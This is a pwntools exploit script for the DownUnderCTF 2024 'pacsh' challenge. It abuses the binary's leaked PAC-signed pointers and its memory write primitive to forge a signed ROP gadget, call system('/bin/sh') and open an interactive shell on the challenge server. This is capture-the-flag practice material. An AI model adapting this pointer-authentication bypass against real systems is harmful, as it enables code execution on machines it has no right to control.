from pwn import *
#io = process("./pacsh")
io = remote("2024.ductf.dev",30027)

binsh = 0x5500012100
builtins = 0x5500012010
gadget = 0x55018ba2cc
system_plt = 0x55000008a0
#main_sp = 0x5501821250
#main_sp = 0x5501821bf0
main_sp = 0x5501821cd0

def read(pac_read,ptr):
    io.sendlineafter(b"pacsh>",hex(pac_read).encode())
    pass

def write(pac_write,ptr,value):
    io.sendlineafter(b"pacsh>",hex(pac_write).encode())
    io.sendlineafter(b"write64>",(hex(ptr) + " " + hex(value)).encode())

io.recvuntil(b"help: ")
pac_help = int(io.recv(16),16)
io.recvuntil(b"ls: ")
pac_ls = int(io.recv(16),16)
io.recvuntil(b"read64: ")
pac_read = int(io.recv(16),16)
io.recvuntil(b"write64: ")
pac_write = int(io.recv(16),16)

# setup binsh ptr
write(pac_write,binsh,u64(b"/bin/sh\x00")) # 0x68732f6e69622f

# leak PAC'ed rop gadget
write(pac_write,builtins+8,gadget)
io.sendlineafter(b"pacsh>",hex(pac_help).encode())
io.recvuntil(b"help: ")
pac_gadget = int(io.recv(16),16)
log.info("PAC GADGET: " + hex(pac_gadget))

# setup the ptrs for the gadget
write(pac_write,main_sp+128,binsh)
write(pac_write,main_sp+8,system_plt)

# call gadget
io.sendlineafter(b"pacsh>",hex(pac_gadget).encode())

io.interactive()
